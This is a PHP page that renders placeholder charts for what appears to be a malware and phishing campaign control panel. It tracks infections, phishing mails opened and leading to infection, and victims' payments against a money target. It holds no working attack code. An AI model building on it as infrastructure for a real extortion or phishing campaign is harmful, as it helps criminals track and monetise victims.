<?php

include_once "../base.html";
include_once "leftpanel.html";



### TAKE the Numbers
//$createinfect = file_get_contents("MIDDLEWAREXXX/dashboard/status/createinfect");
$createinfect = '{"created":280,"infected":80}';
$createinfect = json_decode($createinfect,true);
//$types_count = file_get_contents("MIDDLEWAREXXX/dashboard/status/typescount");
$types_count = '{"phishing":200,"adware":50,"wulnware":30}';
$types_count = json_decode($types_count,true);
//$payments = file_get_contents("MIDDLEWAREXXX/dashboard/status/paid");
$payments = '{"paid":50,"notpaid":30,"collected":3000,"target":10000}';
$payments = json_decode($payments,true);
//$mails = file_get_contents("MIDDLEWAREXXX/dashboard/status/mails");
$mails = '{"sent":200,"opened":125,"download":70,"infectedbyphishingmail":30}';
$mails = json_decode($mails,true);






function createDonutDiv($id,$title){
    $htmldiv ='<div class="col-md-5 py-1">
                <h2 class="display-5">'.$title.'</h2>
                <div class="card">
                    <div class="card-body">
                        <canvas id="'.$id.'"></canvas>
                    </div>
                </div>
            </div>';
    return $htmldiv;
}

?>



<main class="col-md-9 ms-sm-auto col-lg-11 px-md-4">

    <h1 class="display-5">HEADER1</h1>
    
    <script src="/js/chart.js"></script>

    <div class="container" id="graphics">
        
            <div class="row py-2">
                <?php
                
                    $titles = array("Target Amount - Collected Money","Created - Infected", "Types", "Paid - Not Paid", "Sent Mail - Opened Mail",
                                    "Opened Mail - Infected");
                    $donut_count = 0;
                    foreach($titles as $tit){
                        echo createDonutDiv("chDonut".++$donut_count,$tit);
                    }

                ?>

        
        </div>
    </div>


    <script>
        var colors = ['#ff0000','#007bff','#c3e6cb','#28a745','#333333','#dc3545','#6c757d'];

        function donutmaker(elementid, labels, data){
            
            var donutOptions = {
            cutoutPercentage: 55, 
            legend: {position:'bottom', padding:5, labels: {pointStyle:'circle', usePointStyle:true}}
            };

            
            var chDonutData = {
                labels: labels,
                datasets: [
                {
                    backgroundColor: colors.slice(0,2),
                    borderWidth: 0,
                    data: data
                }
                ]
            };

            var chDonut = document.getElementById(elementid);
            if (chDonut) {
                var cd=new Chart(chDonut, {
                    type: 'pie',
                    data: chDonutData,
                    options: donutOptions
                });
            }

        }

        <?php        

            $slice_names = array();
            $slice_values = array();
            foreach($titles as $tit){
                if($tit === "Types"){$tit = "phishing - adware - wulnware";}
                array_push($slice_names, explode(" - ",$tit));
            }
            $slice_values = array(
                array($payments["target"],$payments["collected"]),
                array($createinfect["created"],$createinfect["infected"]),
                array($types_count["phishing"],$types_count["adware"],$types_count["wulnware"]),
                array($payments["paid"],$payments["notpaid"]),
                array($mails["sent"],$mails["opened"]),
                array($mails["download"],$mails["infectedbyphishingmail"]),
            );
        
            $slice_names = json_encode($slice_names);
            $slice_values = json_encode($slice_values);
            echo "var slice_names = $slice_names;";
            echo "var slice_values = $slice_values;";
            echo "var donut_count= $donut_count;";
        ?>
        
        for (var i = 1; i<=donut_count; i++){   
            donutmaker("chDonut"+i,slice_names[i-1],slice_values[i-1]);
        }
        

    </script>

</main>